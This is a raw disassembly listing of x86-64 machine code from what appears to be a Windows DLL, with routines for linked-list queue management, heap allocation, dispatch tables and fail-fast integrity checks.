   1800024eb:	48 ff 15 c6 86 03 00 	rex.W call *0x386c6(%rip)        # 0x18003abb8
   1800024f2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800024f7:	48 8b 0b             	mov    (%rbx),%rcx
   1800024fa:	48 39 59 08          	cmp    %rbx,0x8(%rcx)
   1800024fe:	0f 85 a6 04 00 00    	jne    0x1800029aa
   180002504:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180002508:	48 39 18             	cmp    %rbx,(%rax)
   18000250b:	0f 85 99 04 00 00    	jne    0x1800029aa
   180002511:	ff 0d a1 f9 03 00    	decl   0x3f9a1(%rip)        # 0x180041eb8
   180002517:	48 89 08             	mov    %rcx,(%rax)
   18000251a:	81 fe 00 22 00 00    	cmp    $0x2200,%esi
   180002520:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002524:	8d 45 57             	lea    0x57(%rbp),%eax
   180002527:	0f 45 f8             	cmovne %eax,%edi
   18000252a:	89 7b 18             	mov    %edi,0x18(%rbx)
   18000252d:	48 8d 3d fc f9 03 00 	lea    0x3f9fc(%rip),%rdi        # 0x180041f30
   180002534:	48 8b 05 f5 f9 03 00 	mov    0x3f9f5(%rip),%rax        # 0x180041f30
   18000253b:	48 3b c7             	cmp    %rdi,%rax
   18000253e:	75 1e                	jne    0x18000255e
   180002540:	48 39 78 08          	cmp    %rdi,0x8(%rax)
   180002544:	0f 85 60 04 00 00    	jne    0x1800029aa
   18000254a:	48 89 03             	mov    %rax,(%rbx)
   18000254d:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   180002551:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180002555:	48 89 1d d4 f9 03 00 	mov    %rbx,0x3f9d4(%rip)        # 0x180041f30
   18000255c:	eb 40                	jmp    0x18000259e
   18000255e:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   180002562:	48 8b d7             	mov    %rdi,%rdx
   180002565:	48 8b c8             	mov    %rax,%rcx
   180002568:	4c 3b 40 10          	cmp    0x10(%rax),%r8
   18000256c:	72 18                	jb     0x180002586
   18000256e:	48 8b 08             	mov    (%rax),%rcx
   180002571:	48 8b d0             	mov    %rax,%rdx
   180002574:	48 3b cf             	cmp    %rdi,%rcx
   180002577:	0f 84 bf 00 00 00    	je     0x18000263c
   18000257d:	48 8b c1             	mov    %rcx,%rax
   180002580:	4c 3b 41 10          	cmp    0x10(%rcx),%r8
   180002584:	73 e8                	jae    0x18000256e
   180002586:	48 39 51 08          	cmp    %rdx,0x8(%rcx)
   18000258a:	0f 85 1a 04 00 00    	jne    0x1800029aa
   180002590:	48 89 0b             	mov    %rcx,(%rbx)
   180002593:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   180002597:	48 89 59 08          	mov    %rbx,0x8(%rcx)
   18000259b:	48 89 1a             	mov    %rbx,(%rdx)
   18000259e:	be 01 00 00 00       	mov    $0x1,%esi
   1800025a3:	4c 8d 3d 16 f9 03 00 	lea    0x3f916(%rip),%r15        # 0x180041ec0
   1800025aa:	48 8b 1d 7f f9 03 00 	mov    0x3f97f(%rip),%rbx        # 0x180041f30
   1800025b1:	48 8b 05 70 f9 03 00 	mov    0x3f970(%rip),%rax        # 0x180041f28
   1800025b8:	48 39 43 10          	cmp    %rax,0x10(%rbx)
   1800025bc:	0f 85 cc 02 00 00    	jne    0x18000288e
   1800025c2:	48 01 35 5f f9 03 00 	add    %rsi,0x3f95f(%rip)        # 0x180041f28
   1800025c9:	48 39 7b 08          	cmp    %rdi,0x8(%rbx)
   1800025cd:	0f 85 d7 03 00 00    	jne    0x1800029aa
   1800025d3:	48 8b 03             	mov    (%rbx),%rax
   1800025d6:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   1800025da:	0f 85 ca 03 00 00    	jne    0x1800029aa
   1800025e0:	83 3d 69 e2 03 00 00 	cmpl   $0x0,0x3e269(%rip)        # 0x180040850
   1800025e7:	48 89 05 42 f9 03 00 	mov    %rax,0x3f942(%rip)        # 0x180041f30
   1800025ee:	48 89 78 08          	mov    %rdi,0x8(%rax)
   1800025f2:	75 6e                	jne    0x180002662
   1800025f4:	48 8b 0d 65 e2 03 00 	mov    0x3e265(%rip),%rcx        # 0x180040860
   1800025fb:	4c 8b c3             	mov    %rbx,%r8
   1800025fe:	33 d2                	xor    %edx,%edx
   180002600:	48 ff 15 99 83 03 00 	rex.W call *0x38399(%rip)        # 0x18003a9a0
   180002607:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000260c:	33 ed                	xor    %ebp,%ebp
   18000260e:	39 2d a4 f8 03 00    	cmp    %ebp,0x3f8a4(%rip)        # 0x180041eb8
   180002614:	75 19                	jne    0x18000262f
   180002616:	39 2d a0 f8 03 00    	cmp    %ebp,0x3f8a0(%rip)        # 0x180041ebc
   18000261c:	75 11                	jne    0x18000262f
   18000261e:	48 8b 05 03 f9 03 00 	mov    0x3f903(%rip),%rax        # 0x180041f28
   180002625:	48 39 05 f4 f8 03 00 	cmp    %rax,0x3f8f4(%rip)        # 0x180041f20
   18000262c:	0f 44 ee             	cmove  %esi,%ebp
   18000262f:	85 ed                	test   %ebp,%ebp
   180002631:	0f 85 3b 03 00 00    	jne    0x180002972
   180002637:	e9 45 02 00 00       	jmp    0x180002881
   18000263c:	48 8b 05 f5 f8 03 00 	mov    0x3f8f5(%rip),%rax        # 0x180041f38
   180002643:	48 39 38             	cmp    %rdi,(%rax)
   180002646:	0f 85 5e 03 00 00    	jne    0x1800029aa
   18000264c:	48 89 3b             	mov    %rdi,(%rbx)
   18000264f:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002653:	48 89 18             	mov    %rbx,(%rax)
   180002656:	48 89 1d db f8 03 00 	mov    %rbx,0x3f8db(%rip)        # 0x180041f38
   18000265d:	e9 3c ff ff ff       	jmp    0x18000259e
   180002662:	83 7b 18 00          	cmpl   $0x0,0x18(%rbx)
   180002666:	0f 85 68 01 00 00    	jne    0x1800027d4
   18000266c:	01 35 4a f8 03 00    	add    %esi,0x3f84a(%rip)        # 0x180041ebc
   180002672:	48 8d 0d 67 f8 03 00 	lea    0x3f867(%rip),%rcx        # 0x180041ee0
   180002679:	48 ff 15 30 85 03 00 	rex.W call *0x38530(%rip)        # 0x18003abb0
   180002680:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002685:	48 83 a3 60 22 00 00 	andq   $0x0,0x2260(%rbx)
   18000268c:	00 
   18000268d:	48 8d 8b 40 44 00 00 	lea    0x4440(%rbx),%rcx
   180002694:	48 83 a3 68 22 00 00 	andq   $0x0,0x2268(%rbx)
   18000269b:	00 
   18000269c:	33 d2                	xor    %edx,%edx
   18000269e:	44 8d 42 40          	lea    0x40(%rdx),%r8d
   1800026a2:	e8 57 6f 03 00       	call   0x1800395fe
   1800026a7:	48 8b 43 48          	mov    0x48(%rbx),%rax
   1800026ab:	66 83 a3 38 44 00 00 	andw   $0x0,0x4438(%rbx)
   1800026b2:	00 
   1800026b3:	48 89 83 48 22 00 00 	mov    %rax,0x2248(%rbx)
   1800026ba:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1800026be:	48 89 83 50 22 00 00 	mov    %rax,0x2250(%rbx)
   1800026c5:	48 8b 43 58          	mov    0x58(%rbx),%rax
   1800026c9:	48 89 83 58 22 00 00 	mov    %rax,0x2258(%rbx)
   1800026d0:	48 83 f8 07          	cmp    $0x7,%rax
   1800026d4:	77 6e                	ja     0x180002744
   1800026d6:	74 63                	je     0x18000273b
   1800026d8:	48 2b c6             	sub    %rsi,%rax
   1800026db:	74 55                	je     0x180002732
   1800026dd:	48 2b c6             	sub    %rsi,%rax
   1800026e0:	74 44                	je     0x180002726
   1800026e2:	48 2b c6             	sub    %rsi,%rax
   1800026e5:	74 33                	je     0x18000271a
   1800026e7:	48 2b c6             	sub    %rsi,%rax
   1800026ea:	74 22                	je     0x18000270e
   1800026ec:	48 2b c6             	sub    %rsi,%rax
   1800026ef:	74 11                	je     0x180002702
   1800026f1:	48 3b c6             	cmp    %rsi,%rax
   1800026f4:	75 6d                	jne    0x180002763
   1800026f6:	48 8d 05 f3 ba 00 00 	lea    0xbaf3(%rip),%rax        # 0x18000e1f0
   1800026fd:	e9 b1 00 00 00       	jmp    0x1800027b3
   180002702:	48 8d 05 d7 b9 00 00 	lea    0xb9d7(%rip),%rax        # 0x18000e0e0
   180002709:	e9 a5 00 00 00       	jmp    0x1800027b3
   18000270e:	48 8d 05 5b b8 00 00 	lea    0xb85b(%rip),%rax        # 0x18000df70
   180002715:	e9 99 00 00 00       	jmp    0x1800027b3
   18000271a:	48 8d 05 4f b6 00 00 	lea    0xb64f(%rip),%rax        # 0x18000dd70
   180002721:	e9 8d 00 00 00       	jmp    0x1800027b3
   180002726:	48 8d 05 93 c2 00 00 	lea    0xc293(%rip),%rax        # 0x18000e9c0
   18000272d:	e9 81 00 00 00       	jmp    0x1800027b3
   180002732:	48 8d 05 57 b4 00 00 	lea    0xb457(%rip),%rax        # 0x18000db90
   180002739:	eb 78                	jmp    0x1800027b3
   18000273b:	48 8d 05 be bd 00 00 	lea    0xbdbe(%rip),%rax        # 0x18000e500
   180002742:	eb 6f                	jmp    0x1800027b3
   180002744:	48 83 e8 08          	sub    $0x8,%rax
   180002748:	74 62                	je     0x1800027ac
   18000274a:	48 2b c6             	sub    %rsi,%rax
   18000274d:	74 54                	je     0x1800027a3
   18000274f:	48 2b c6             	sub    %rsi,%rax
   180002752:	74 46                	je     0x18000279a
   180002754:	48 2b c6             	sub    %rsi,%rax
   180002757:	74 30                	je     0x180002789
   180002759:	48 2b c6             	sub    %rsi,%rax
   18000275c:	74 22                	je     0x180002780
   18000275e:	48 3b c6             	cmp    %rsi,%rax
   180002761:	74 14                	je     0x180002777
   180002763:	48 8b cb             	mov    %rbx,%rcx
   180002766:	c7 83 60 22 00 00 bb 	movl   $0xc00000bb,0x2260(%rbx)
   18000276d:	00 00 c0 
   180002770:	e8 eb fa ff ff       	call   0x180002260
   180002775:	eb 45                	jmp    0x1800027bc
   180002777:	48 8d 05 72 bc 00 00 	lea    0xbc72(%rip),%rax        # 0x18000e3f0
   18000277e:	eb 33                	jmp    0x1800027b3
   180002780:	48 8d 05 89 bb 00 00 	lea    0xbb89(%rip),%rax        # 0x18000e310
   180002787:	eb 2a                	jmp    0x1800027b3
   180002789:	48 83 a3 58 22 00 00 	andq   $0x0,0x2258(%rbx)
   180002790:	00 
   180002791:	48 8d 05 98 c3 00 00 	lea    0xc398(%rip),%rax        # 0x18000eb30
   180002798:	eb 19                	jmp    0x1800027b3
   18000279a:	48 8d 05 5f c0 00 00 	lea    0xc05f(%rip),%rax        # 0x18000e800
   1800027a1:	eb 10                	jmp    0x1800027b3
   1800027a3:	48 8d 05 76 bf 00 00 	lea    0xbf76(%rip),%rax        # 0x18000e720
   1800027aa:	eb 07                	jmp    0x1800027b3
   1800027ac:	48 8d 05 8d be 00 00 	lea    0xbe8d(%rip),%rax        # 0x18000e640
   1800027b3:	48 8b cb             	mov    %rbx,%rcx
   1800027b6:	ff 15 dc 86 03 00    	call   *0x386dc(%rip)        # 0x18003ae98
   1800027bc:	48 8d 0d 1d f7 03 00 	lea    0x3f71d(%rip),%rcx        # 0x180041ee0
   1800027c3:	48 ff 15 ee 83 03 00 	rex.W call *0x383ee(%rip)        # 0x18003abb8
   1800027ca:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800027cf:	e9 ad 00 00 00       	jmp    0x180002881
   1800027d4:	33 d2                	xor    %edx,%edx
   1800027d6:	41 b8 80 44 00 00    	mov    $0x4480,%r8d
   1800027dc:	48 8b cb             	mov    %rbx,%rcx
   1800027df:	e8 1a 6e 03 00       	call   0x1800395fe
   1800027e4:	48 8d 05 d5 fc ff ff 	lea    -0x32b(%rip),%rax        # 0x1800024c0
   1800027eb:	48 89 43 20          	mov    %rax,0x20(%rbx)
   1800027ef:	48 8b 05 d2 f6 03 00 	mov    0x3f6d2(%rip),%rax        # 0x180041ec8
   1800027f6:	4c 39 38             	cmp    %r15,(%rax)
   1800027f9:	0f 85 ab 01 00 00    	jne    0x1800029aa
   1800027ff:	01 35 b3 f6 03 00    	add    %esi,0x3f6b3(%rip)        # 0x180041eb8
   180002805:	48 8b cb             	mov    %rbx,%rcx
   180002808:	48 89 43 08          	mov    %rax,0x8(%rbx)
   18000280c:	4c 89 3b             	mov    %r15,(%rbx)
   18000280f:	48 89 18             	mov    %rbx,(%rax)
   180002812:	48 8b 05 07 f7 03 00 	mov    0x3f707(%rip),%rax        # 0x180041f20
   180002819:	48 01 35 00 f7 03 00 	add    %rsi,0x3f700(%rip)        # 0x180041f20
   180002820:	48 89 1d a1 f6 03 00 	mov    %rbx,0x3f6a1(%rip)        # 0x180041ec8
   180002827:	48 89 43 10          	mov    %rax,0x10(%rbx)
   18000282b:	e8 9c f9 ff ff       	call   0x1800021cc
   180002830:	85 c0                	test   %eax,%eax
   180002832:	74 4d                	je     0x180002881
   180002834:	3d 03 01 00 00       	cmp    $0x103,%eax
   180002839:	74 46                	je     0x180002881
   18000283b:	48 8b 0b             	mov    (%rbx),%rcx
   18000283e:	48 39 59 08          	cmp    %rbx,0x8(%rcx)
   180002842:	0f 85 62 01 00 00    	jne    0x1800029aa
   180002848:	48 8b 43 08          	mov    0x8(%rbx),%rax
   18000284c:	48 39 18             	cmp    %rbx,(%rax)
   18000284f:	0f 85 55 01 00 00    	jne    0x1800029aa
   180002855:	ff 0d 5d f6 03 00    	decl   0x3f65d(%rip)        # 0x180041eb8
   18000285b:	4c 8b c3             	mov    %rbx,%r8
   18000285e:	48 29 35 bb f6 03 00 	sub    %rsi,0x3f6bb(%rip)        # 0x180041f20
   180002865:	33 d2                	xor    %edx,%edx
   180002867:	48 89 08             	mov    %rcx,(%rax)
   18000286a:	48 89 41 08          	mov    %rax,0x8(%rcx)
   18000286e:	48 8b 0d eb df 03 00 	mov    0x3dfeb(%rip),%rcx        # 0x180040860
   180002875:	48 ff 15 24 81 03 00 	rex.W call *0x38124(%rip)        # 0x18003a9a0
   18000287c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002881:	48 39 3d a8 f6 03 00 	cmp    %rdi,0x3f6a8(%rip)        # 0x180041f30
   180002888:	0f 85 1c fd ff ff    	jne    0x1800025aa
   18000288e:	83 3d bb df 03 00 00 	cmpl   $0x0,0x3dfbb(%rip)        # 0x180040850
   180002895:	0f 84 d7 00 00 00    	je     0x180002972
   18000289b:	83 3d 16 f6 03 00 05 	cmpl   $0x5,0x3f616(%rip)        # 0x180041eb8
   1800028a2:	0f 83 ca 00 00 00    	jae    0x180002972
   1800028a8:	48 8b 0d b1 df 03 00 	mov    0x3dfb1(%rip),%rcx        # 0x180040860
   1800028af:	ba 08 00 00 00       	mov    $0x8,%edx
   1800028b4:	41 b8 80 44 00 00    	mov    $0x4480,%r8d
   1800028ba:	48 ff 15 e7 80 03 00 	rex.W call *0x380e7(%rip)        # 0x18003a9a8
   1800028c1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800028c6:	48 8b d8             	mov    %rax,%rbx
   1800028c9:	48 85 c0             	test   %rax,%rax
   1800028cc:	0f 84 a0 00 00 00    	je     0x180002972
   1800028d2:	48 8d 05 e7 fb ff ff 	lea    -0x419(%rip),%rax        # 0x1800024c0
   1800028d9:	48 89 43 20          	mov    %rax,0x20(%rbx)
   1800028dd:	48 8b 05 e4 f5 03 00 	mov    0x3f5e4(%rip),%rax        # 0x180041ec8
   1800028e4:	4c 39 38             	cmp    %r15,(%rax)
   1800028e7:	0f 85 bd 00 00 00    	jne    0x1800029aa
   1800028ed:	01 35 c5 f5 03 00    	add    %esi,0x3f5c5(%rip)        # 0x180041eb8
   1800028f3:	48 8b cb             	mov    %rbx,%rcx
   1800028f6:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1800028fa:	4c 89 3b             	mov    %r15,(%rbx)
   1800028fd:	48 89 18             	mov    %rbx,(%rax)
   180002900:	48 8b 05 19 f6 03 00 	mov    0x3f619(%rip),%rax        # 0x180041f20
   180002907:	48 89 1d ba f5 03 00 	mov    %rbx,0x3f5ba(%rip)        # 0x180041ec8
   18000290e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180002912:	48 03 c6             	add    %rsi,%rax
   180002915:	48 89 05 04 f6 03 00 	mov    %rax,0x3f604(%rip)        # 0x180041f20
   18000291c:	e8 ab f8 ff ff       	call   0x1800021cc
   180002921:	85 c0                	test   %eax,%eax
   180002923:	0f 84 65 ff ff ff    	je     0x18000288e
   180002929:	3d 03 01 00 00       	cmp    $0x103,%eax
   18000292e:	0f 84 5a ff ff ff    	je     0x18000288e
   180002934:	48 8b 03             	mov    (%rbx),%rax
   180002937:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   18000293b:	75 6d                	jne    0x1800029aa
   18000293d:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   180002941:	48 39 1a             	cmp    %rbx,(%rdx)
   180002944:	75 64                	jne    0x1800029aa
   180002946:	ff 0d 6c f5 03 00    	decl   0x3f56c(%rip)        # 0x180041eb8
   18000294c:	4c 8b c3             	mov    %rbx,%r8
   18000294f:	48 29 35 ca f5 03 00 	sub    %rsi,0x3f5ca(%rip)        # 0x180041f20
   180002956:	48 8b 0d 03 df 03 00 	mov    0x3df03(%rip),%rcx        # 0x180040860
   18000295d:	48 89 02             	mov    %rax,(%rdx)
   180002960:	48 89 50 08          	mov    %rdx,0x8(%rax)
   180002964:	33 d2                	xor    %edx,%edx
   180002966:	48 ff 15 33 80 03 00 	rex.W call *0x38033(%rip)        # 0x18003a9a0
   18000296d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002972:	48 8d 0d 67 f5 03 00 	lea    0x3f567(%rip),%rcx        # 0x180041ee0
   180002979:	48 ff 15 30 82 03 00 	rex.W call *0x38230(%rip)        # 0x18003abb0
   180002980:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002985:	85 ed                	test   %ebp,%ebp
   180002987:	74 05                	je     0x18000298e
   180002989:	e8 f6 00 00 00       	call   0x180002a84
   18000298e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002993:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002998:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000299d:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800029a2:	48 83 c4 20          	add    $0x20,%rsp
   1800029a6:	41 5f                	pop    %r15
   1800029a8:	c3                   	ret
   1800029a9:	cc                   	int3
   1800029aa:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800029af:	cd 29                	int    $0x29
   1800029b1:	cc                   	int3
   1800029b2:	cc                   	int3
   1800029b3:	cc                   	int3
   1800029b4:	cc                   	int3
   1800029b5:	cc                   	int3
   1800029b6:	cc                   	int3
   1800029b7:	cc                   	int3
   1800029b8:	cc                   	int3
   1800029b9:	cc                   	int3
   1800029ba:	cc                   	int3
   1800029bb:	cc                   	int3
   1800029bc:	cc                   	int3
   1800029bd:	cc                   	int3
   1800029be:	cc                   	int3
   1800029bf:	cc                   	int3
   1800029c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800029c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800029ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800029cf:	57                   	push   %rdi
   1800029d0:	48 83 ec 20          	sub    $0x20,%rsp
   1800029d4:	48 8d 0d 05 f5 03 00 	lea    0x3f505(%rip),%rcx        # 0x180041ee0
   1800029db:	49 8b f0             	mov    %r8,%rsi
   1800029de:	48 8b ea             	mov    %rdx,%rbp
   1800029e1:	48 ff 15 d0 81 03 00 	rex.W call *0x381d0(%rip)        # 0x18003abb8
   1800029e8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800029ed:	48 8b 3d 14 f5 03 00 	mov    0x3f514(%rip),%rdi        # 0x180041f08
   1800029f4:	33 db                	xor    %ebx,%ebx
   1800029f6:	48 83 25 0a f5 03 00 	andq   $0x0,0x3f50a(%rip)        # 0x180041f08
   1800029fd:	00 
   1800029fe:	83 25 4b de 03 00 00 	andl   $0x0,0x3de4b(%rip)        # 0x180040850
   180002a05:	39 1d ad f4 03 00    	cmp    %ebx,0x3f4ad(%rip)        # 0x180041eb8
   180002a0b:	75 1c                	jne    0x180002a29
   180002a0d:	39 1d a9 f4 03 00    	cmp    %ebx,0x3f4a9(%rip)        # 0x180041ebc
   180002a13:	75 14                	jne    0x180002a29
   180002a15:	48 8b 05 0c f5 03 00 	mov    0x3f50c(%rip),%rax        # 0x180041f28
   180002a1c:	8d 53 01             	lea    0x1(%rbx),%edx
   180002a1f:	48 39 05 fa f4 03 00 	cmp    %rax,0x3f4fa(%rip)        # 0x180041f20
   180002a26:	0f 44 da             	cmove  %edx,%ebx
   180002a29:	48 8d 0d b0 f4 03 00 	lea    0x3f4b0(%rip),%rcx        # 0x180041ee0
   180002a30:	48 89 2d d9 f4 03 00 	mov    %rbp,0x3f4d9(%rip)        # 0x180041f10
   180002a37:	48 89 35 da f4 03 00 	mov    %rsi,0x3f4da(%rip)        # 0x180041f18
   180002a3e:	48 ff 15 6b 81 03 00 	rex.W call *0x3816b(%rip)        # 0x18003abb0
   180002a45:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002a4a:	48 85 ff             	test   %rdi,%rdi
   180002a4d:	74 0f                	je     0x180002a5e
   180002a4f:	48 8b cf             	mov    %rdi,%rcx
   180002a52:	48 ff 15 37 7f 03 00 	rex.W call *0x37f37(%rip)        # 0x18003a990
   180002a59:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002a5e:	85 db                	test   %ebx,%ebx
   180002a60:	74 05                	je     0x180002a67
   180002a62:	e8 1d 00 00 00       	call   0x180002a84
   180002a67:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a6c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002a71:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002a76:	48 83 c4 20          	add    $0x20,%rsp
   180002a7a:	5f                   	pop    %rdi
   180002a7b:	c3                   	ret
   180002a7c:	cc                   	int3
   180002a7d:	cc                   	int3
   180002a7e:	cc                   	int3
   180002a7f:	cc                   	int3
   180002a80:	cc                   	int3
   180002a81:	cc                   	int3
   180002a82:	cc                   	int3
   180002a83:	cc                   	int3
   180002a84:	40 53                	rex push %rbx
   180002a86:	48 83 ec 20          	sub    $0x20,%rsp
   180002a8a:	48 8d 1d 5f f3 03 00 	lea    0x3f35f(%rip),%rbx        # 0x180041df0
   180002a91:	eb 32                	jmp    0x180002ac5
   180002a93:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   180002a97:	75 58                	jne    0x180002af1
   180002a99:	48 8b 08             	mov    (%rax),%rcx
   180002a9c:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   180002aa0:	75 4f                	jne    0x180002af1
   180002aa2:	48 89 0d 47 f3 03 00 	mov    %rcx,0x3f347(%rip)        # 0x180041df0
   180002aa9:	4c 8b c0             	mov    %rax,%r8
   180002aac:	48 89 59 08          	mov    %rbx,0x8(%rcx)
   180002ab0:	33 d2                	xor    %edx,%edx
   180002ab2:	48 8b 0d a7 dd 03 00 	mov    0x3dda7(%rip),%rcx        # 0x180040860
   180002ab9:	48 ff 15 e0 7e 03 00 	rex.W call *0x37ee0(%rip)        # 0x18003a9a0
   180002ac0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002ac5:	48 8b 05 24 f3 03 00 	mov    0x3f324(%rip),%rax        # 0x180041df0
   180002acc:	48 3b c3             	cmp    %rbx,%rax
   180002acf:	75 c2                	jne    0x180002a93
   180002ad1:	48 8b 05 38 f4 03 00 	mov    0x3f438(%rip),%rax        # 0x180041f10
   180002ad8:	48 85 c0             	test   %rax,%rax
   180002adb:	74 0d                	je     0x180002aea
   180002add:	48 8b 0d 34 f4 03 00 	mov    0x3f434(%rip),%rcx        # 0x180041f18
   180002ae4:	ff 15 ae 83 03 00    	call   *0x383ae(%rip)        # 0x18003ae98
   180002aea:	48 83 c4 20          	add    $0x20,%rsp
   180002aee:	5b                   	pop    %rbx
   180002aef:	c3                   	ret
   180002af0:	cc                   	int3
   180002af1:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002af6:	cd 29                	int    $0x29
   180002af8:	cc                   	int3
   180002af9:	cc                   	int3
   180002afa:	cc                   	int3
   180002afb:	cc                   	int3
   180002afc:	cc                   	int3
   180002afd:	cc                   	int3
   180002afe:	cc                   	int3
   180002aff:	cc                   	int3
   180002b00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002b05:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180002b0a:	57                   	push   %rdi
   180002b0b:	41 56                	push   %r14
   180002b0d:	41 57                	push   %r15
   180002b0f:	48 83 ec 20          	sub    $0x20,%rsp
   180002b13:	83 25 a2 f3 03 00 00 	andl   $0x0,0x3f3a2(%rip)        # 0x180041ebc
   180002b1a:	48 8d 05 0f f4 03 00 	lea    0x3f40f(%rip),%rax        # 0x180041f30
   180002b21:	83 25 90 f3 03 00 00 	andl   $0x0,0x3f390(%rip)        # 0x180041eb8
   180002b28:	4c 8d 3d 91 f3 03 00 	lea    0x3f391(%rip),%r15        # 0x180041ec0
   180002b2f:	48 83 25 d1 f3 03 00 	andq   $0x0,0x3f3d1(%rip)        # 0x180041f08
   180002b36:	00 
   180002b37:	48 8d 0d a2 f3 03 00 	lea    0x3f3a2(%rip),%rcx        # 0x180041ee0
   180002b3e:	83 25 0b dd 03 00 00 	andl   $0x0,0x3dd0b(%rip)        # 0x180040850
   180002b45:	41 be 01 00 00 00    	mov    $0x1,%r14d
   180002b4b:	48 83 25 bd f3 03 00 	andq   $0x0,0x3f3bd(%rip)        # 0x180041f10
   180002b52:	00 
   180002b53:	48 83 25 bd f3 03 00 	andq   $0x0,0x3f3bd(%rip)        # 0x180041f18
   180002b5a:	00 
   180002b5b:	4c 89 35 c6 f3 03 00 	mov    %r14,0x3f3c6(%rip)        # 0x180041f28
   180002b62:	4c 89 35 b7 f3 03 00 	mov    %r14,0x3f3b7(%rip)        # 0x180041f20
   180002b69:	4c 89 3d 58 f3 03 00 	mov    %r15,0x3f358(%rip)        # 0x180041ec8
   180002b70:	4c 89 3d 49 f3 03 00 	mov    %r15,0x3f349(%rip)        # 0x180041ec0
   180002b77:	48 89 05 ba f3 03 00 	mov    %rax,0x3f3ba(%rip)        # 0x180041f38
   180002b7e:	48 89 05 ab f3 03 00 	mov    %rax,0x3f3ab(%rip)        # 0x180041f30
   180002b85:	48 ff 15 d4 82 03 00 	rex.W call *0x382d4(%rip)        # 0x18003ae60
   180002b8c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002b91:	8b f8                	mov    %eax,%edi
   180002b93:	85 c0                	test   %eax,%eax
   180002b95:	75 6a                	jne    0x180002c01
   180002b97:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002b9c:	44 89 35 b1 dc 03 00 	mov    %r14d,0x3dcb1(%rip)        # 0x180040854
   180002ba3:	e8 24 f5 ff ff       	call   0x1800020cc
   180002ba8:	8b f8                	mov    %eax,%edi
   180002baa:	85 c0                	test   %eax,%eax
   180002bac:	75 53                	jne    0x180002c01
   180002bae:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   180002bb3:	4c 8d 0d 06 fe ff ff 	lea    -0x1fa(%rip),%r9        # 0x1800029c0
   180002bba:	48 8b 0d e7 f2 03 00 	mov    0x3f2e7(%rip),%rcx        # 0x180041ea8
   180002bc1:	45 33 c0             	xor    %r8d,%r8d
   180002bc4:	48 89 15 3d f3 03 00 	mov    %rdx,0x3f33d(%rip)        # 0x180041f08
   180002bcb:	44 89 35 7e dc 03 00 	mov    %r14d,0x3dc7e(%rip)        # 0x180040850
   180002bd2:	e8 29 d5 00 00       	call   0x180010100
   180002bd7:	85 c0                	test   %eax,%eax
   180002bd9:	74 75                	je     0x180002c50
   180002bdb:	48 8b 0d 26 f3 03 00 	mov    0x3f326(%rip),%rcx        # 0x180041f08
   180002be2:	48 ff 15 a7 7d 03 00 	rex.W call *0x37da7(%rip)        # 0x18003a990
   180002be9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002bee:	48 83 25 12 f3 03 00 	andq   $0x0,0x3f312(%rip)        # 0x180041f08
   180002bf5:	00 
   180002bf6:	21 3d 54 dc 03 00    	and    %edi,0x3dc54(%rip)        # 0x180040850
   180002bfc:	bf 9a 00 00 c0       	mov    $0xc000009a,%edi
   180002c01:	8b cf                	mov    %edi,%ecx
   180002c03:	e8 94 f7 ff ff       	call   0x18000239c
   180002c08:	83 3d a9 f2 03 00 00 	cmpl   $0x0,0x3f2a9(%rip)        # 0x180041eb8
   180002c0f:	75 1e                	jne    0x180002c2f
   180002c11:	83 3d a4 f2 03 00 00 	cmpl   $0x0,0x3f2a4(%rip)        # 0x180041ebc
   180002c18:	75 15                	jne    0x180002c2f
   180002c1a:	48 8b 05 07 f3 03 00 	mov    0x3f307(%rip),%rax        # 0x180041f28
   180002c21:	48 39 05 f8 f2 03 00 	cmp    %rax,0x3f2f8(%rip)        # 0x180041f20
   180002c28:	75 05                	jne    0x180002c2f
   180002c2a:	e8 55 fe ff ff       	call   0x180002a84
   180002c2f:	8b cf                	mov    %edi,%ecx
   180002c31:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180002c36:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180002c3b:	48 83 c4 20          	add    $0x20,%rsp
